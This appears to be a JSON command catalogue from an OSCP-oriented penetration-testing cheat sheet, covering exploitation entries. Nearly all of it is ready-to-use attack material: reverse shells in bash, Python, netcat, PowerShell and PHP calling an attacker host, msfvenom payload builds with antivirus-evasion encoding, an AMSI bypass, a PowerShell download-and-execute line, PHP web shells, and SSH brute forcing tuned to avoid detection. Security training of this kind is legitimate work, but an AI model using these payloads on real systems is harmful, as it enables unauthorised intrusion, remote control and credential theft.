{
  "category": "exploitation",
  "description": "Exploitation commands and reverse shells",
  "commands": [
    {
      "id": "bash-reverse-shell",
      "name": "Bash Reverse Shell",
      "category": "exploitation",
      "command": "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
      "description": "Simple bash reverse shell",
      "tags": ["LINUX", "RCE", "QUICK_WIN", "OSCP:HIGH", "REVERSE_SHELL"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port",
          "example": "4444",
          "required": true
        }
      ],
      "flag_explanations": {
        "-i": "Interactive shell",
        ">&": "Redirect both stdout and stderr",
        "/dev/tcp/": "Bash built-in TCP device for network connections",
        "0>&1": "Redirect stdin to the same descriptor as stdout"
      },
      "success_indicators": [
        "Connection established",
        "Shell prompt appears",
        "Commands execute on target"
      ],
      "failure_indicators": [
        "Connection refused",
        "bash: /dev/tcp: No such file or directory",
        "No response"
      ],
      "next_steps": [
        "Upgrade shell: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "Background with Ctrl+Z, then: stty raw -echo; fg",
        "Export terminal: export TERM=xterm",
        "Check user: whoami && id"
      ],
      "alternatives": ["bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'", "exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do $line 2>&5 >&5; done"],
      "notes": "Start listener with: nc -nvlp <LPORT>",
      "oscp_relevance": "high"
    },
    {
      "id": "python-reverse-shell",
      "name": "Python Reverse Shell",
      "category": "exploitation",
      "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
      "description": "Python reverse shell with PTY",
      "tags": ["CROSS_PLATFORM", "RCE", "OSCP:HIGH", "REVERSE_SHELL"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port",
          "example": "4444",
          "required": true
        }
      ],
      "flag_explanations": {
        "-c": "Execute Python code from command line",
        "socket.AF_INET": "IPv4 socket",
        "socket.SOCK_STREAM": "TCP socket",
        "os.dup2()": "Duplicate file descriptors for stdin/stdout/stderr",
        "pty.spawn()": "Spawn PTY for better shell interaction"
      },
      "success_indicators": [
        "Shell spawned",
        "PTY allocated",
        "Interactive shell available"
      ],
      "failure_indicators": [
        "ModuleNotFoundError",
        "Connection refused",
        "SyntaxError"
      ],
      "next_steps": [
        "Upgrade shell: Ctrl+Z, stty raw -echo; fg",
        "Set terminal: export TERM=xterm",
        "Check Python version: python --version",
        "Enumerate system: uname -a && id"
      ],
      "alternatives": ["python -c '...'", "python2 -c '...'", "exec(\"\"\"import socket,subprocess,os...\"\"\")"],
      "notes": "Works with Python 2 or 3 with minor adjustments",
      "oscp_relevance": "high"
    },
    {
      "id": "nc-reverse-shell",
      "name": "Netcat Reverse Shell",
      "category": "exploitation",
      "command": "nc -e /bin/bash <LHOST> <LPORT>",
      "description": "Netcat reverse shell with execute",
      "tags": ["LINUX", "RCE", "OSCP:HIGH", "REVERSE_SHELL"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port",
          "example": "4444",
          "required": true
        }
      ],
      "flag_explanations": {
        "-e": "Execute program after connection (not available in all versions)",
        "/bin/bash": "Shell to execute upon connection"
      },
      "success_indicators": [
        "Connection established",
        "Shell prompt available",
        "Commands execute"
      ],
      "failure_indicators": [
        "invalid option -- 'e'",
        "Connection refused",
        "nc: command not found"
      ],
      "next_steps": [
        "Try alternative if -e not supported: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <LHOST> <LPORT> >/tmp/f",
        "Upgrade shell with Python",
        "Transfer files with nc: nc -l -p 1234 > file",
        "Check nc version: nc -h"
      ],
      "alternatives": ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <LHOST> <LPORT> >/tmp/f", "nc <LHOST> <LPORT> | /bin/bash | nc <LHOST> <LPORT+1>"],
      "notes": "Not all netcat versions support -e flag",
      "oscp_relevance": "high"
    },
    {
      "id": "powershell-reverse-shell",
      "name": "PowerShell Reverse Shell",
      "category": "exploitation",
      "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
      "description": "PowerShell TCP reverse shell",
      "tags": ["WINDOWS", "RCE", "OSCP:HIGH", "REVERSE_SHELL"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port",
          "example": "4444",
          "required": true
        }
      ],
      "flag_explanations": {
        "-nop": "No profile - skip PowerShell profile loading",
        "-c": "Execute command",
        "-exec bypass": "Bypass execution policy (add if needed)"
      },
      "success_indicators": [
        "PS prompt appears",
        "Commands execute",
        "PowerShell version displayed"
      ],
      "failure_indicators": [
        "ExecutionPolicy prevents",
        "Connection refused",
        "Access denied"
      ],
      "next_steps": [
        "Check privileges: whoami /priv",
        "System info: systeminfo",
        "Bypass AMSI: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "Download files: Invoke-WebRequest -Uri http://<LHOST>/file -OutFile file"
      ],
      "alternatives": ["powershell -exec bypass -f shell.ps1", "powershell IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')"],
      "notes": "Use -exec bypass for execution policy issues",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-linux-elf",
      "name": "MSFVenom Linux Binary",
      "category": "exploitation",
      "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > <FILE>",
      "description": "Generate Linux reverse shell binary",
      "tags": ["LINUX", "PAYLOAD_GENERATION", "OSCP:HIGH"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port",
          "example": "4444",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "Output filename",
          "example": "shell.elf",
          "required": true
        }
      ],
      "flag_explanations": {
        "-p": "Payload to generate",
        "LHOST=": "Local host (attacker IP)",
        "LPORT=": "Local port for listener",
        "-f": "Output format (elf for Linux executable)",
        ">": "Redirect output to file"
      },
      "success_indicators": [
        "Payload size:",
        "Final size of elf file:",
        "Saved as:"
      ],
      "failure_indicators": [
        "No platform was selected",
        "Invalid payload",
        "No options"
      ],
      "next_steps": [
        "Start listener: nc -nvlp <LPORT>",
        "Transfer to target: python3 -m http.server 8000",
        "Make executable: chmod +x shell.elf",
        "Execute: ./shell.elf"
      ],
      "alternatives": ["msfvenom -p linux/x86/shell_reverse_tcp", "msfvenom -p linux/x64/meterpreter/reverse_tcp"],
      "notes": "Check target architecture (x86 vs x64)",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-windows-exe",
      "name": "MSFVenom Windows Binary",
      "category": "exploitation",
      "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > <FILE>",
      "description": "Generate Windows reverse shell executable",
      "tags": ["WINDOWS", "PAYLOAD_GENERATION", "OSCP:HIGH"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port",
          "example": "4444",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "Output filename",
          "example": "shell.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-p": "Payload to generate",
        "windows/x64/": "Windows 64-bit architecture",
        "-f exe": "Output format as Windows executable",
        "-e": "Encoder (add -e x86/shikata_ga_nai for AV evasion)"
      },
      "success_indicators": [
        "Payload size:",
        "Final size of exe file:",
        "Saved as:"
      ],
      "failure_indicators": [
        "No platform was selected",
        "Invalid payload",
        "Encoder failed"
      ],
      "next_steps": [
        "Encode for AV evasion: msfvenom ... -e x86/shikata_ga_nai -i 9",
        "Start listener: nc -nvlp <LPORT> or use multi/handler",
        "Transfer via SMB: impacket-smbserver share .",
        "Execute on target: .\\shell.exe"
      ],
      "alternatives": ["msfvenom -p windows/shell_reverse_tcp", "msfvenom -p windows/meterpreter/reverse_tcp", "msfvenom -p windows/x64/meterpreter/reverse_https"],
      "notes": "May trigger AV, consider encoding",
      "oscp_relevance": "high"
    },
    {
      "id": "php-reverse-shell",
      "name": "PHP Reverse Shell",
      "category": "exploitation",
      "command": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\"); ?>",
      "description": "PHP code for reverse shell",
      "tags": ["WEB", "PHP", "RCE", "OSCP:HIGH"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port",
          "example": "4444",
          "required": true
        }
      ],
      "flag_explanations": {
        "exec()": "PHP function to execute system commands",
        "system()": "Alternative PHP function for command execution",
        "shell_exec()": "Another alternative for command execution"
      },
      "success_indicators": [
        "Connection established",
        "Shell received",
        "No PHP errors"
      ],
      "failure_indicators": [
        "PHP Parse error",
        "exec() disabled",
        "Connection refused"
      ],
      "next_steps": [
        "Try pentestmonkey PHP reverse shell for more reliability",
        "Check disabled functions: <?php phpinfo(); ?>",
        "Try web shell first: <?php system($_GET['cmd']); ?>",
        "Upload to writable directory: /tmp, /var/tmp, /var/www/html/uploads"
      ],
      "alternatives": ["<?php system($_GET['cmd']); ?>", "<?php passthru($_GET['cmd']); ?>", "<?php $sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/bash -i <&3 >&3 2>&3\"); ?>"],
      "notes": "Upload as .php file or inject in vulnerable parameter",
      "oscp_relevance": "high"
    },
    {
      "id": "searchsploit",
      "name": "Searchsploit Exploit Search",
      "category": "exploitation",
      "command": "searchsploit <SERVICE> <VERSION>",
      "description": "Search for exploits in Exploit-DB",
      "tags": ["ENUM", "RESEARCH", "OSCP:HIGH"],
      "variables": [
        {
          "name": "<SERVICE>",
          "description": "Service name",
          "example": "apache",
          "required": true
        },
        {
          "name": "<VERSION>",
          "description": "Version number",
          "example": "2.4.49",
          "required": false
        }
      ],
      "flag_explanations": {
        "-x": "Examine exploit code",
        "-m": "Mirror/copy exploit to current directory",
        "-www": "Show exploitdb.com URL",
        "--nmap": "Parse nmap XML output file"
      },
      "success_indicators": [
        "Exploit Title",
        "Path:",
        "EDB-ID:"
      ],
      "failure_indicators": [
        "No Results",
        "Exploits: No Result",
        "Shellcodes: No Result"
      ],
      "next_steps": [
        "Examine exploit: searchsploit -x <PATH>",
        "Copy exploit: searchsploit -m <PATH>",
        "Check requirements in exploit code",
        "Test in lab environment first"
      ],
      "alternatives": ["searchsploit -www <SERVICE>", "searchsploit --nmap scan.xml", "google: site:exploit-db.com <SERVICE>"],
      "notes": "Use -x to examine exploit code, -m to copy",
      "oscp_relevance": "high"
    },
    {
      "id": "hydra-ssh",
      "name": "SSH Brute Force",
      "category": "exploitation",
      "command": "hydra -l <USERNAME> -P <WORDLIST> ssh://<TARGET>",
      "description": "Brute force SSH login",
      "tags": ["BRUTEFORCE", "SSH", "NOISY", "OSCP:MEDIUM"],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.100",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Username to try",
          "example": "admin",
          "required": true
        },
        {
          "name": "<WORDLIST>",
          "description": "Password wordlist",
          "example": "/usr/share/wordlists/rockyou.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "-l": "Single username",
        "-L": "Username list file",
        "-p": "Single password",
        "-P": "Password list file",
        "-t": "Number of parallel tasks (default 16)"
      },
      "success_indicators": [
        "[22][ssh] host:",
        "login:",
        "password:"
      ],
      "failure_indicators": [
        "0 valid passwords found",
        "all child processes were disabled",
        "target does not support"
      ],
      "next_steps": [
        "SSH with found creds: ssh <USERNAME>@<TARGET>",
        "Try password reuse on other services",
        "Check sudo privileges: sudo -l",
        "Look for SSH keys: find / -name id_rsa 2>/dev/null"
      ],
      "alternatives": ["medusa -h <TARGET> -u <USERNAME> -P <WORDLIST> -M ssh", "crackmapexec ssh <TARGET> -u <USERNAME> -p <WORDLIST>"],
      "notes": "Use -t to limit threads and avoid detection",
      "oscp_relevance": "medium"
    },
    {
      "id": "web-shell-php",
      "name": "Simple PHP Web Shell",
      "category": "exploitation",
      "command": "<?php system($_GET['cmd']); ?>",
      "description": "Minimal PHP web shell",
      "tags": ["WEB", "PHP", "RCE", "QUICK_WIN", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "system()": "Execute system command and display output",
        "$_GET['cmd']": "Get command from URL parameter",
        "$_POST['cmd']": "Alternative using POST for stealth"
      },
      "success_indicators": [
        "Command output in response",
        "200 OK status",
        "Expected command results"
      ],
      "failure_indicators": [
        "500 Internal Server Error",
        "system() has been disabled",
        "403 Forbidden"
      ],
      "next_steps": [
        "Test execution: shell.php?cmd=whoami",
        "Get reverse shell: shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<IP>/<PORT>+0>%261'",
        "Upload better shell: shell.php?cmd=wget+http://<IP>/shell.sh",
        "Check writeable dirs: shell.php?cmd=find+/+-type+d+-writable+2>/dev/null"
      ],
      "alternatives": ["<?php echo shell_exec($_GET['cmd']); ?>", "<?php eval($_POST['cmd']); ?>", "<?php passthru($_REQUEST['cmd']); ?>"],
      "notes": "Access with: ?cmd=whoami",
      "oscp_relevance": "high"
    }
  ]
}